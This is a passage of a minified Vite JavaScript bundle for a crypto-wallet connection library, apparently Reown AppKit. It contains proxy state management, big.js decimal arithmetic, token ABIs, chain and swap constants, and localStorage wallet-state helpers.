const __vite__mapDeps=(i,m=__vite__mapDeps,d=(m.f||(m.f=["assets/embedded-wallet-DzA9AN3g.js","assets/if-defined-B2LkykGS.js","assets/index-CIHBYZig.js","assets/index-BVqosklO.js","assets/index-Cg9PbcWC.js","assets/index-Q7A3SEzO.js","assets/index-D5xY_wtk.js","assets/index-5z-Vy9nI.js","assets/index-C3GoA_jf.js","assets/index-BoD7Ca25.js","assets/email-B1CRGlMC.js","assets/index-CNPJFghY.js","assets/socials-CJkON6QM.js","assets/index-CTqZKVai.js","assets/index-DMdvEHiY.js","assets/index-CvL9dBcB.js","assets/index-z3IiC58L.js","assets/swaps-DQPoFDJD.js","assets/index-52wACUZV.js","assets/index-CvlWdo4a.js","assets/index-Bviinuq0.js","assets/send-D3Wmkn1o.js","assets/index-C0SLeZLU.js","assets/receive-BfJykGwc.js","assets/index-D80Aexbr.js","assets/onramp-aZhAY-Yz.js","assets/index-BdoVycvY.js","assets/index-Fp7XEJJt.js","assets/transactions-Ls_9Fz2_.js","assets/index-DAiPr126.js","assets/index-Cgi-VDiW.js","assets/index-CYlHE1PB.js","assets/w3m-modal-caA8yHtE.js"])))=>i.map(i=>d[i]);
(function(){const e=document.createElement("link").relList;if(e&&e.supports&&e.supports("modulepreload"))return;for(const i of document.querySelectorAll('link[rel="modulepreload"]'))n(i);new MutationObserver(i=>{for(const s of i)if(s.type==="childList")for(const o of s.addedNodes)o.tagName==="LINK"&&o.rel==="modulepreload"&&n(o)}).observe(document,{childList:!0,subtree:!0});function r(i){const s={};return i.integrity&&(s.integrity=i.integrity),i.referrerPolicy&&(s.referrerPolicy=i.referrerPolicy),i.crossOrigin==="use-credentials"?s.credentials="include":i.crossOrigin==="anonymous"?s.credentials="omit":s.credentials="same-origin",s}function n(i){if(i.ep)return;i.ep=!0;const s=r(i);fetch(i.href,s)}})();const uS=Symbol(),iw=Object.getPrototypeOf,dm=new WeakMap,lS=t=>t&&(dm.has(t)?dm.get(t):iw(t)===Object.prototype||iw(t)===Array.prototype),hS=t=>lS(t)&&t[uS]||null,sw=(t,e=!0)=>{dm.set(t,e)},xd={},_p=t=>typeof t=="object"&&t!==null,Ls=new WeakMap,bu=new WeakSet,dS=(t=Object.is,e=(u,l)=>new Proxy(u,l),r=u=>_p(u)&&!bu.has(u)&&(Array.isArray(u)||!(Symbol.iterator in u))&&!(u instanceof WeakMap)&&!(u instanceof WeakSet)&&!(u instanceof Error)&&!(u instanceof Number)&&!(u instanceof Date)&&!(u instanceof String)&&!(u instanceof RegExp)&&!(u instanceof ArrayBuffer),n=u=>{switch(u.status){case"fulfilled":return u.value;case"rejected":throw u.reason;default:throw u}},i=new WeakMap,s=(u,l,h=n)=>{const d=i.get(u);if((d==null?void 0:d[0])===l)return d[1];const g=Array.isArray(u)?[]:Object.create(Object.getPrototypeOf(u));return sw(g,!0),i.set(u,[l,g]),Reflect.ownKeys(u).forEach(y=>{if(Object.getOwnPropertyDescriptor(g,y))return;const m=Reflect.get(u,y),{enumerable:b}=Reflect.getOwnPropertyDescriptor(u,y),A={value:m,enumerable:b,configurable:!0};if(bu.has(m))sw(m,!1);else if(m instanceof Promise)delete A.value,A.get=()=>h(m);else if(Ls.has(m)){const[_,T]=Ls.get(m);A.value=s(_,T(),h)}Object.defineProperty(g,y,A)}),Object.preventExtensions(g)},o=new WeakMap,a=[1,1],c=u=>{if(!_p(u))throw new Error("object required");const l=o.get(u);if(l)return l;let h=a[0];const d=new Set,g=(D,F=++a[0])=>{h!==F&&(h=F,d.forEach(j=>j(D,F)))};let y=a[1];const m=(D=++a[1])=>(y!==D&&!d.size&&(y=D,A.forEach(([F])=>{const j=F[1](D);j>h&&(h=j)})),h),b=D=>(F,j)=>{const L=[...F];L[1]=[D,...L[1]],g(L,j)},A=new Map,_=(D,F)=>{if((xd?"production":void 0)!=="production"&&A.has(D))throw new Error("prop listener already exists");if(d.size){const j=F[3](b(D));A.set(D,[F,j])}else A.set(D,[F])},T=D=>{var F;const j=A.get(D);j&&(A.delete(D),(F=j[1])==null||F.call(j))},P=D=>(d.add(D),d.size===1&&A.forEach(([j,L],N)=>{if((xd?"production":void 0)!=="production"&&L)throw new Error("remove already exists");const f=j[3](b(N));A.set(N,[j,f])}),()=>{d.delete(D),d.size===0&&A.forEach(([j,L],N)=>{L&&(L(),A.set(N,[j]))})}),S=Array.isArray(u)?[]:Object.create(Object.getPrototypeOf(u)),O=e(S,{deleteProperty(D,F){const j=Reflect.get(D,F);T(F);const L=Reflect.deleteProperty(D,F);return L&&g(["delete",[F],j]),L},set(D,F,j,L){const N=Reflect.has(D,F),f=Reflect.get(D,F,L);if(N&&(t(f,j)||o.has(j)&&t(f,o.get(j))))return!0;T(F),_p(j)&&(j=hS(j)||j);let p=j;if(j instanceof Promise)j.then(w=>{j.status="fulfilled",j.value=w,g(["resolve",[F],w])}).catch(w=>{j.status="rejected",j.reason=w,g(["reject",[F],w])});else{!Ls.has(j)&&r(j)&&(p=c(j));const w=!bu.has(p)&&Ls.get(p);w&&_(F,w)}return Reflect.set(D,F,p,L),g(["set",[F],j,f]),!0}});o.set(u,O);const $=[S,m,s,P];return Ls.set(O,$),Reflect.ownKeys(u).forEach(D=>{const F=Object.getOwnPropertyDescriptor(u,D);"value"in F&&(O[D]=u[D],delete F.value,delete F.writable),Object.defineProperty(S,D,F)}),O})=>[c,Ls,bu,t,e,r,n,i,s,o,a],[fS]=dS();function Kt(t={}){return fS(t)}function Xr(t,e,r){const n=Ls.get(t);(xd?"production":void 0)!=="production"&&!n&&console.warn("Please use proxy object");let i;const s=[],o=n[3];let a=!1;const u=o(l=>{s.push(l),i||(i=Promise.resolve().then(()=>{i=void 0,a&&e(s.splice(0))}))});return a=!0,()=>{a=!1,u()}}function ju(t,e){const r=Ls.get(t);(xd?"production":void 0)!=="production"&&!r&&console.warn("Please use proxy object");const[n,i,s]=r;return s(n,i(),e)}function Jo(t){return bu.add(t),t}function tn(t,e,r,n){let i=t[e];return Xr(t,()=>{const s=t[e];Object.is(i,s)||r(i=s)})}function pS(t){const e=Kt({data:Array.from([]),has(r){return this.data.some(n=>n[0]===r)},set(r,n){const i=this.data.find(s=>s[0]===r);return i?i[1]=n:this.data.push([r,n]),this},get(r){var n;return(n=this.data.find(i=>i[0]===r))==null?void 0:n[1]},delete(r){const n=this.data.findIndex(i=>i[0]===r);return n===-1?!1:(this.data.splice(n,1),!0)},clear(){this.data.splice(0)},get size(){return this.data.length},toJSON(){return new Map(this.data)},forEach(r){this.data.forEach(n=>{r(n[1],n[0],this)})},keys(){return this.data.map(r=>r[0]).values()},values(){return this.data.map(r=>r[1]).values()},entries(){return new Map(this.data).entries()},get[Symbol.toStringTag](){return"Map"},[Symbol.iterator](){return this.entries()}});return Object.defineProperties(e,{data:{enumerable:!1},size:{enumerable:!1},toJSON:{enumerable:!1}}),Object.seal(e),e}var ci=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{};function co(t){return t&&t.__esModule&&Object.prototype.hasOwnProperty.call(t,"default")?t.default:t}function z0(t){if(Object.prototype.hasOwnProperty.call(t,"__esModule"))return t;var e=t.default;if(typeof e=="function"){var r=function n(){return this instanceof n?Reflect.construct(e,arguments,this.constructor):e.apply(this,arguments)};r.prototype=e.prototype}else r={};return Object.defineProperty(r,"__esModule",{value:!0}),Object.keys(t).forEach(function(n){var i=Object.getOwnPropertyDescriptor(t,n);Object.defineProperty(r,n,i.get?i:{enumerable:!0,get:function(){return t[n]}})}),r}const qu={caipNetworkIdToNumber(t){return t?Number(t.split(":")[1]):void 0},parseEvmChainId(t){return typeof t=="string"?this.caipNetworkIdToNumber(t):t},getNetworksByNamespace(t,e){return(t==null?void 0:t.filter(r=>r.chainNamespace===e))||[]},getFirstNetworkByNamespace(t,e){return this.getNetworksByNamespace(t,e)[0]}};var gS=20,mS=1,Oc=1e6,yS=1e6,wS=-7,bS=21,vS=!1,Wl="[big.js] ",ma=Wl+"Invalid ",bf=ma+"decimal places",ES=ma+"rounding mode",S1=Wl+"Division by zero",ct={},Ui=void 0,AS=/^-?(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i;function N1(){function t(e){var r=this;if(!(r instanceof t))return e===Ui?N1():new t(e);if(e instanceof t)r.s=e.s,r.e=e.e,r.c=e.c.slice();else{if(typeof e!="string"){if(t.strict===!0&&typeof e!="bigint")throw TypeError(ma+"value");e=e===0&&1/e<0?"-0":String(e)}_S(r,e)}r.constructor=t}return t.prototype=ct,t.DP=gS,t.RM=mS,t.NE=wS,t.PE=bS,t.strict=vS,t.roundDown=0,t.roundHalfUp=1,t.roundHalfEven=2,t.roundUp=3,t}function _S(t,e){var r,n,i;if(!AS.test(e))throw Error(ma+"number");for(t.s=e.charAt(0)=="-"?(e=e.slice(1),-1):1,(r=e.indexOf("."))>-1&&(e=e.replace(".","")),(n=e.search(/e/i))>0?(r<0&&(r=n),r+=+e.slice(n+1),e=e.substring(0,n)):r<0&&(r=e.length),i=e.length,n=0;n<i&&e.charAt(n)=="0";)++n;if(n==i)t.c=[t.e=0];else{for(;i>0&&e.charAt(--i)=="0";);for(t.e=r-n-1,t.c=[],r=0;n<=i;)t.c[r++]=+e.charAt(n++)}return t}function ya(t,e,r,n){var i=t.c;if(r===Ui&&(r=t.constructor.RM),r!==0&&r!==1&&r!==2&&r!==3)throw Error(ES);if(e<1)n=r===3&&(n||!!i[0])||e===0&&(r===1&&i[0]>=5||r===2&&(i[0]>5||i[0]===5&&(n||i[1]!==Ui))),i.length=1,n?(t.e=t.e-e+1,i[0]=1):i[0]=t.e=0;else if(e<i.length){if(n=r===1&&i[e]>=5||r===2&&(i[e]>5||i[e]===5&&(n||i[e+1]!==Ui||i[e-1]&1))||r===3&&(n||!!i[0]),i.length=e,n){for(;++i[--e]>9;)if(i[e]=0,e===0){++t.e,i.unshift(1);break}}for(e=i.length;!i[--e];)i.pop()}return t}function wa(t,e,r){var n=t.e,i=t.c.join(""),s=i.length;if(e)i=i.charAt(0)+(s>1?"."+i.slice(1):"")+(n<0?"e":"e+")+n;else if(n<0){for(;++n;)i="0"+i;i="0."+i}else if(n>0)if(++n>s)for(n-=s;n--;)i+="0";else n<s&&(i=i.slice(0,n)+"."+i.slice(n));else s>1&&(i=i.charAt(0)+"."+i.slice(1));return t.s<0&&r?"-"+i:i}ct.abs=function(){var t=new this.constructor(this);return t.s=1,t};ct.cmp=function(t){var e,r=this,n=r.c,i=(t=new r.constructor(t)).c,s=r.s,o=t.s,a=r.e,c=t.e;if(!n[0]||!i[0])return n[0]?s:i[0]?-o:0;if(s!=o)return s;if(e=s<0,a!=c)return a>c^e?1:-1;for(o=(a=n.length)<(c=i.length)?a:c,s=-1;++s<o;)if(n[s]!=i[s])return n[s]>i[s]^e?1:-1;return a==c?0:a>c^e?1:-1};ct.div=function(t){var e=this,r=e.constructor,n=e.c,i=(t=new r(t)).c,s=e.s==t.s?1:-1,o=r.DP;if(o!==~~o||o<0||o>Oc)throw Error(bf);if(!i[0])throw Error(S1);if(!n[0])return t.s=s,t.c=[t.e=0],t;var a,c,u,l,h,d=i.slice(),g=a=i.length,y=n.length,m=n.slice(0,a),b=m.length,A=t,_=A.c=[],T=0,P=o+(A.e=e.e-t.e)+1;for(A.s=s,s=P<0?0:P,d.unshift(0);b++<a;)m.push(0);do{for(u=0;u<10;u++){if(a!=(b=m.length))l=a>b?1:-1;else for(h=-1,l=0;++h<a;)if(i[h]!=m[h]){l=i[h]>m[h]?1:-1;break}if(l<0){for(c=b==a?i:d;b;){if(m[--b]<c[b]){for(h=b;h&&!m[--h];)m[h]=9;--m[h],m[b]+=10}m[b]-=c[b]}for(;!m[0];)m.shift()}else break}_[T++]=l?u:++u,m[0]&&l?m[b]=n[g]||0:m=[n[g]]}while((g++<y||m[0]!==Ui)&&s--);return!_[0]&&T!=1&&(_.shift(),A.e--,P--),T>P&&ya(A,P,r.RM,m[0]!==Ui),A};ct.eq=function(t){return this.cmp(t)===0};ct.gt=function(t){return this.cmp(t)>0};ct.gte=function(t){return this.cmp(t)>-1};ct.lt=function(t){return this.cmp(t)<0};ct.lte=function(t){return this.cmp(t)<1};ct.minus=ct.sub=function(t){var e,r,n,i,s=this,o=s.constructor,a=s.s,c=(t=new o(t)).s;if(a!=c)return t.s=-c,s.plus(t);var u=s.c.slice(),l=s.e,h=t.c,d=t.e;if(!u[0]||!h[0])return h[0]?t.s=-c:u[0]?t=new o(s):t.s=1,t;if(a=l-d){for((i=a<0)?(a=-a,n=u):(d=l,n=h),n.reverse(),c=a;c--;)n.push(0);n.reverse()}else for(r=((i=u.length<h.length)?u:h).length,a=c=0;c<r;c++)if(u[c]!=h[c]){i=u[c]<h[c];break}if(i&&(n=u,u=h,h=n,t.s=-t.s),(c=(r=h.length)-(e=u.length))>0)for(;c--;)u[e++]=0;for(c=e;r>a;){if(u[--r]<h[r]){for(e=r;e&&!u[--e];)u[e]=9;--u[e],u[r]+=10}u[r]-=h[r]}for(;u[--c]===0;)u.pop();for(;u[0]===0;)u.shift(),--d;return u[0]||(t.s=1,u=[d=0]),t.c=u,t.e=d,t};ct.mod=function(t){var e,r=this,n=r.constructor,i=r.s,s=(t=new n(t)).s;if(!t.c[0])throw Error(S1);return r.s=t.s=1,e=t.cmp(r)==1,r.s=i,t.s=s,e?new n(r):(i=n.DP,s=n.RM,n.DP=n.RM=0,r=r.div(t),n.DP=i,n.RM=s,this.minus(r.times(t)))};ct.neg=function(){var t=new this.constructor(this);return t.s=-t.s,t};ct.plus=ct.add=function(t){var e,r,n,i=this,s=i.constructor;if(t=new s(t),i.s!=t.s)return t.s=-t.s,i.minus(t);var o=i.e,a=i.c,c=t.e,u=t.c;if(!a[0]||!u[0])return u[0]||(a[0]?t=new s(i):t.s=i.s),t;if(a=a.slice(),e=o-c){for(e>0?(c=o,n=u):(e=-e,n=a),n.reverse();e--;)n.push(0);n.reverse()}for(a.length-u.length<0&&(n=u,u=a,a=n),e=u.length,r=0;e;a[e]%=10)r=(a[--e]=a[e]+u[e]+r)/10|0;for(r&&(a.unshift(r),++c),e=a.length;a[--e]===0;)a.pop();return t.c=a,t.e=c,t};ct.pow=function(t){var e=this,r=new e.constructor("1"),n=r,i=t<0;if(t!==~~t||t<-1e6||t>yS)throw Error(ma+"exponent");for(i&&(t=-t);t&1&&(n=n.times(e)),t>>=1,!!t;)e=e.times(e);return i?r.div(n):n};ct.prec=function(t,e){if(t!==~~t||t<1||t>Oc)throw Error(ma+"precision");return ya(new this.constructor(this),t,e)};ct.round=function(t,e){if(t===Ui)t=0;else if(t!==~~t||t<-1e6||t>Oc)throw Error(bf);return ya(new this.constructor(this),t+this.e+1,e)};ct.sqrt=function(){var t,e,r,n=this,i=n.constructor,s=n.s,o=n.e,a=new i("0.5");if(!n.c[0])return new i(n);if(s<0)throw Error(Wl+"No square root");s=Math.sqrt(+wa(n,!0,!0)),s===0||s===1/0?(e=n.c.join(""),e.length+o&1||(e+="0"),s=Math.sqrt(e),o=((o+1)/2|0)-(o<0||o&1),t=new i((s==1/0?"5e":(s=s.toExponential()).slice(0,s.indexOf("e")+1))+o)):t=new i(s+""),o=t.e+(i.DP+=4);do r=t,t=a.times(r.plus(n.div(r)));while(r.c.slice(0,o).join("")!==t.c.slice(0,o).join(""));return ya(t,(i.DP-=4)+t.e+1,i.RM)};ct.times=ct.mul=function(t){var e,r=this,n=r.constructor,i=r.c,s=(t=new n(t)).c,o=i.length,a=s.length,c=r.e,u=t.e;if(t.s=r.s==t.s?1:-1,!i[0]||!s[0])return t.c=[t.e=0],t;for(t.e=c+u,o<a&&(e=i,i=s,s=e,u=o,o=a,a=u),e=new Array(u=o+a);u--;)e[u]=0;for(c=a;c--;){for(a=0,u=o+c;u>c;)a=e[u]+s[c]*i[u-c-1]+a,e[u--]=a%10,a=a/10|0;e[u]=a}for(a?++t.e:e.shift(),c=e.length;!e[--c];)e.pop();return t.c=e,t};ct.toExponential=function(t,e){var r=this,n=r.c[0];if(t!==Ui){if(t!==~~t||t<0||t>Oc)throw Error(bf);for(r=ya(new r.constructor(r),++t,e);r.c.length<t;)r.c.push(0)}return wa(r,!0,!!n)};ct.toFixed=function(t,e){var r=this,n=r.c[0];if(t!==Ui){if(t!==~~t||t<0||t>Oc)throw Error(bf);for(r=ya(new r.constructor(r),t+r.e+1,e),t=t+r.e+1;r.c.length<t;)r.c.push(0)}return wa(r,!1,!!n)};ct[Symbol.for("nodejs.util.inspect.custom")]=ct.toJSON=ct.toString=function(){var t=this,e=t.constructor;return wa(t,t.e<=e.NE||t.e>=e.PE,!!t.c[0])};ct.toNumber=function(){var t=+wa(this,!0,!0);if(this.constructor.strict===!0&&!this.eq(t.toString()))throw Error(Wl+"Imprecise conversion");return t};ct.toPrecision=function(t,e){var r=this,n=r.constructor,i=r.c[0];if(t!==Ui){if(t!==~~t||t<1||t>Oc)throw Error(ma+"precision");for(r=ya(new n(r),t,e);r.c.length<t;)r.c.push(0)}return wa(r,t<=r.e||r.e<=n.NE||r.e>=n.PE,!!i)};ct.valueOf=function(){var t=this,e=t.constructor;if(e.strict===!0)throw Error(Wl+"valueOf disallowed");return wa(t,t.e<=e.NE||t.e>=e.PE,!0)};var Qc=N1();const Ah={bigNumber(t){return t?new Qc(t):new Qc(0)},multiply(t,e){if(t===void 0||e===void 0)return new Qc(0);const r=new Qc(t),n=new Qc(e);return r.times(n)},formatNumberToLocalString(t,e=2){return t===void 0?"0.00":typeof t=="number"?t.toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e}):parseFloat(t).toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e})},parseLocalStringToNumber(t){return t===void 0?0:parseFloat(t.replace(/,/gu,""))}},CS=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"_from",type:"address"},{name:"_to",type:"address"},{name:"_value",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],IS=[{type:"function",name:"approve",stateMutability:"nonpayable",inputs:[{name:"spender",type:"address"},{name:"amount",type:"uint256"}],outputs:[{type:"bool"}]}],xS=[{type:"function",name:"transfer",stateMutability:"nonpayable",inputs:[{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[]},{type:"function",name:"transferFrom",stateMutability:"nonpayable",inputs:[{name:"sender",type:"address"},{name:"recipient",type:"address"},{name:"amount",type:"uint256"}],outputs:[{name:"",type:"bool"}]}],Z={WC_NAME_SUFFIX:".reown.id",WC_NAME_SUFFIX_LEGACY:".wcn.id",BLOCKCHAIN_API_RPC_URL:"https://rpc.walletconnect.org",PULSE_API_URL:"https://pulse.walletconnect.org",W3M_API_URL:"https://api.web3modal.org",CONNECTOR_ID:{WALLET_CONNECT:"walletConnect",INJECTED:"injected",WALLET_STANDARD:"announced",COINBASE:"coinbaseWallet",COINBASE_SDK:"coinbaseWalletSDK",SAFE:"safe",LEDGER:"ledger",OKX:"okx",EIP6963:"eip6963",AUTH:"ID_AUTH"},CONNECTOR_NAMES:{AUTH:"Auth"},AUTH_CONNECTOR_SUPPORTED_CHAINS:["eip155","solana"],LIMITS:{PENDING_TRANSACTIONS:99},CHAIN:{EVM:"eip155",SOLANA:"solana",POLKADOT:"polkadot",BITCOIN:"bip122"},CHAIN_NAME_MAP:{eip155:"EVM Networks",solana:"Solana",polkadot:"Polkadot",bip122:"Bitcoin"},ADAPTER_TYPES:{BITCOIN:"bitcoin",SOLANA:"solana",WAGMI:"wagmi",ETHERS:"ethers",ETHERS5:"ethers5"},USDT_CONTRACT_ADDRESSES:["0xdac17f958d2ee523a2206206994597c13d831ec7","0xc2132d05d31c914a87c6611c10748aeb04b58e8f","0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7","0x919C1c267BC06a7039e03fcc2eF738525769109c","0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e","0x55d398326f99059fF775485246999027B3197955","0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9"],HTTP_STATUS_CODES:{SERVICE_UNAVAILABLE:503,FORBIDDEN:403},UNSUPPORTED_NETWORK_NAME:"Unknown Network"},SS={getERC20Abi:t=>Z.USDT_CONTRACT_ADDRESSES.includes(t)?xS:CS,getSwapAbi:()=>IS},Ps={validateCaipAddress(t){var e;if(((e=t.split(":"))==null?void 0:e.length)!==3)throw new Error("Invalid CAIP Address");return t},parseCaipAddress(t){const e=t.split(":");if(e.length!==3)throw new Error(`Invalid CAIP-10 address: ${t}`);const[r,n,i]=e;if(!r||!n||!i)throw new Error(`Invalid CAIP-10 address: ${t}`);return{chainNamespace:r,chainId:n,address:i}},parseCaipNetworkId(t){const e=t.split(":");if(e.length!==2)throw new Error(`Invalid CAIP-2 network id: ${t}`);const[r,n]=e;if(!r||!n)throw new Error(`Invalid CAIP-2 network id: ${t}`);return{chainNamespace:r,chainId:n}}},ke={WALLET_ID:"@appkit/wallet_id",WALLET_NAME:"@appkit/wallet_name",SOLANA_WALLET:"@appkit/solana_wallet",SOLANA_CAIP_CHAIN:"@appkit/solana_caip_chain",ACTIVE_CAIP_NETWORK_ID:"@appkit/active_caip_network_id",CONNECTED_SOCIAL:"@appkit/connected_social",CONNECTED_SOCIAL_USERNAME:"@appkit-wallet/SOCIAL_USERNAME",RECENT_WALLETS:"@appkit/recent_wallets",DEEPLINK_CHOICE:"WALLETCONNECT_DEEPLINK_CHOICE",ACTIVE_NAMESPACE:"@appkit/active_namespace",CONNECTED_NAMESPACES:"@appkit/connected_namespaces",CONNECTION_STATUS:"@appkit/connection_status",SIWX_AUTH_TOKEN:"@appkit/siwx-auth-token",SIWX_NONCE_TOKEN:"@appkit/siwx-nonce-token",TELEGRAM_SOCIAL_PROVIDER:"@appkit/social_provider",NATIVE_BALANCE_CACHE:"@appkit/native_balance_cache",PORTFOLIO_CACHE:"@appkit/portfolio_cache",ENS_CACHE:"@appkit/ens_cache",IDENTITY_CACHE:"@appkit/identity_cache",PREFERRED_ACCOUNT_TYPES:"@appkit/preferred_account_types"};function Cp(t){if(!t)throw new Error("Namespace is required for CONNECTED_CONNECTOR_ID");return`@appkit/${t}:connected_connector_id`}const Pe={setItem(t,e){vu()&&e!==void 0&&localStorage.setItem(t,e)},getItem(t){if(vu())return localStorage.getItem(t)||void 0},removeItem(t){vu()&&localStorage.removeItem(t)},clear(){vu()&&localStorage.clear()}};function vu(){return typeof window<"u"&&typeof localStorage<"u"}function hs(t,e){return e==="light"?{"--w3m-accent":(t==null?void 0:t["--w3m-accent"])||"hsla(231, 100%, 70%, 1)","--w3m-background":"#fff"}:{"--w3m-accent":(t==null?void 0:t["--w3m-accent"])||"hsla(230, 100%, 67%, 1)","--w3m-background":"#121313"}}function NS(t){return(t==null?void 0:t.endsWith(Z.WC_NAME_SUFFIX_LEGACY))||(t==null?void 0:t.endsWith(Z.WC_NAME_SUFFIX))}var ow={};const Ip=(typeof process<"u"&&typeof ow<"u"?ow.NEXT_PUBLIC_SECURE_SITE_ORIGIN:void 0)||"https://secure.walletconnect.org",cY=[{label:"Coinbase",name:"coinbase",feeRange:"1-2%",url:"",supportedChains:["eip155"]},{label:"Meld.io",name:"meld",feeRange:"1-2%",url:"https://meldcrypto.com",supportedChains:["eip155","solana"]}],uY="WXETMuFUQmqqybHuRkSgxv:25B8LJHSfpG6LVjR2ytU5Cwh7Z4Sch2ocoU",Ar={FOUR_MINUTES_MS:24e4,TEN_SEC_MS:1e4,FIVE_SEC_MS:5e3,THREE_SEC_MS:3e3,ONE_SEC_MS:1e3,SECURE_SITE:Ip,SECURE_SITE_DASHBOARD:`${Ip}/dashboard`,SECURE_SITE_FAVICON:`${Ip}/images/favicon.png`,RESTRICTED_TIMEZONES:["ASIA/SHANGHAI","ASIA/URUMQI","ASIA/CHONGQING","ASIA/HARBIN","ASIA/KASHGAR","ASIA/MACAU","ASIA/HONG_KONG","ASIA/MACAO","ASIA/BEIJING","ASIA/HARBIN"],WC_COINBASE_PAY_SDK_CHAINS:["ethereum","arbitrum","polygon","berachain","avalanche-c-chain","optimism","celo","base"],WC_COINBASE_PAY_SDK_FALLBACK_CHAIN:"ethereum",WC_COINBASE_PAY_SDK_CHAIN_NAME_MAP:{Ethereum:"ethereum","Arbitrum One":"arbitrum",Polygon:"polygon",Berachain:"berachain",Avalanche:"avalanche-c-chain","OP Mainnet":"optimism",Celo:"celo",Base:"base"},WC_COINBASE_ONRAMP_APP_ID:"bf18c88d-495a-463b-b249-0b9d3656cf5e",SWAP_SUGGESTED_TOKENS:["ETH","UNI","1INCH","AAVE","SOL","ADA","AVAX","DOT","LINK","NITRO","GAIA","MILK","TRX","NEAR","GNO","WBTC","DAI","WETH","USDC","USDT","ARB","BAL","BICO","CRV","ENS","MATIC","OP"],SWAP_POPULAR_TOKENS:["ETH","UNI","1INCH","AAVE","SOL","ADA","AVAX","DOT","LINK","NITRO","GAIA","MILK","TRX","NEAR","GNO","WBTC","DAI","WETH","USDC","USDT","ARB","BAL","BICO","CRV","ENS","MATIC","OP","METAL","DAI","CHAMP","WOLF","SALE","BAL","BUSD","MUST","BTCpx","ROUTE","HEX","WELT","amDAI","VSQ","VISION","AURUM","pSP","SNX","VC","LINK","CHP","amUSDT","SPHERE","FOX","GIDDY","GFC","OMEN","OX_OLD","DE","WNT"],BALANCE_SUPPORTED_CHAINS:["eip155","solana"],SWAP_SUPPORTED_NETWORKS:["eip155:1","eip155:42161","eip155:10","eip155:324","eip155:8453","eip155:56","eip155:137","eip155:100","eip155:43114","eip155:250","eip155:8217","eip155:1313161554"],NAMES_SUPPORTED_CHAIN_NAMESPACES:["eip155"],ONRAMP_SUPPORTED_CHAIN_NAMESPACES:["eip155","solana"],ACTIVITY_ENABLED_CHAIN_NAMESPACES:["eip155"],NATIVE_TOKEN_ADDRESS:{eip155:"0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",solana:"So11111111111111111111111111111111111111111",polkadot:"0x",bip122:"0x"},CONVERT_SLIPPAGE_TOLERANCE:1,CONNECT_LABELS:{MOBILE:"Open and continue in a new browser tab"},DEFAULT_FEATURES:{swaps:!0,onramp:!0,receive:!0,send:!0,email:!0,emailShowWallets:!0,socials:["google","x","discord","farcaster","github","apple","facebook"],connectorTypeOrder:["walletConnect","recent","injected","featured","custom","external","recommended"],history:!0,analytics:!0,allWallets:!0,legalCheckbox:!1,smartSessions:!1,collapseWallets:!1,walletFeaturesOrder:["onramp","swaps","receive","send"],connectMethodsOrder:void 0},DEFAULT_ACCOUNT_TYPES:{bip122:"payment",eip155:"smartAccount",polkadot:"eoa",solana:"eoa"},ADAPTER_TYPES:{UNIVERSAL:"universal",SOLANA:"solana",WAGMI:"wagmi",ETHERS:"ethers",ETHERS5:"ethers5",BITCOIN:"bitcoin"}},le={cacheExpiry:{portfolio:3e4,nativeBalance:3e4,ens:3e5,identity:3e5},isCacheExpired(t,e){return Date.now()-t>e},getActiveNetworkProps(){const t=le.getActiveNamespace(),e=le.getActiveCaipNetworkId(),r=e?e.split(":")[1]:void 0,n=r?isNaN(Number(r))?r:Number(r):void 0;return{namespace:t,caipNetworkId:e,chainId:n}},setWalletConnectDeepLink({name:t,href:e}){try{Pe.setItem(ke.DEEPLINK_CHOICE,JSON.stringify({href:e,name:t}))}catch{console.info("Unable to set WalletConnect deep link")}},getWalletConnectDeepLink(){try{const t=Pe.getItem(ke.DEEPLINK_CHOICE);if(t)return JSON.parse(t)}catch{console.info("Unable to get WalletConnect deep link")}},deleteWalletConnectDeepLink(){try{Pe.removeItem(ke.DEEPLINK_CHOICE)}catch{console.info("Unable to delete WalletConnect deep link")}},setActiveNamespace(t){try{Pe.setItem(ke.ACTIVE_NAMESPACE,t)}catch{console.info("Unable to set active namespace")}},setActiveCaipNetworkId(t){try{Pe.setItem(ke.ACTIVE_CAIP_NETWORK_ID,t),le.setActiveNamespace(t.split(":")[0])}catch{console.info("Unable to set active caip network id")}},getActiveCaipNetworkId(){try{return Pe.getItem(ke.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to get active caip network id");return}},deleteActiveCaipNetworkId(){try{Pe.removeItem(ke.ACTIVE_CAIP_NETWORK_ID)}catch{console.info("Unable to delete active caip network id")}},deleteConnectedConnectorId(t){try{const e=Cp(t);Pe.removeItem(e)}catch{console.info("Unable to delete connected connector id")}},setAppKitRecent(t){try{const e=le.getRecentWallets();e.find(n=>n.id===t.id)||(e.unshift(t),e.length>2&&e.pop(),Pe.setItem(ke.RECENT_WALLETS,JSON.stringify(e)))}catch{console.info("Unable to set AppKit recent")}},getRecentWallets(){try{const t=Pe.getItem(ke.RECENT_WALLETS);return t?JSON.parse(t):[]}catch{console.info("Unable to get AppKit recent")}return[]},setConnectedConnectorId(t,e){try{const r=Cp(t);Pe.setItem(r,e)}catch{console.info("Unable to set Connected Connector Id")}},getActiveNamespace(){try{return Pe.getItem(ke.ACTIVE_NAMESPACE)}catch{console.info("Unable to get active namespace")}},getConnectedConnectorId(t){if(t)try{const e=Cp(t);return Pe.getItem(e)}catch{console.info("Unable to get connected connector id in namespace ",t)}},setConnectedSocialProvider(t){try{Pe.setItem(ke.CONNECTED_SOCIAL,t)}catch{console.info("Unable to set connected social provider")}},getConnectedSocialProvider(){try{return Pe.getItem(ke.CONNECTED_SOCIAL)}catch{console.info("Unable to get connected social provider")}},deleteConnectedSocialProvider(){try{Pe.removeItem(ke.CONNECTED_SOCIAL)}catch{console.info("Unable to delete connected social provider")}},getConnectedSocialUsername(){try{return 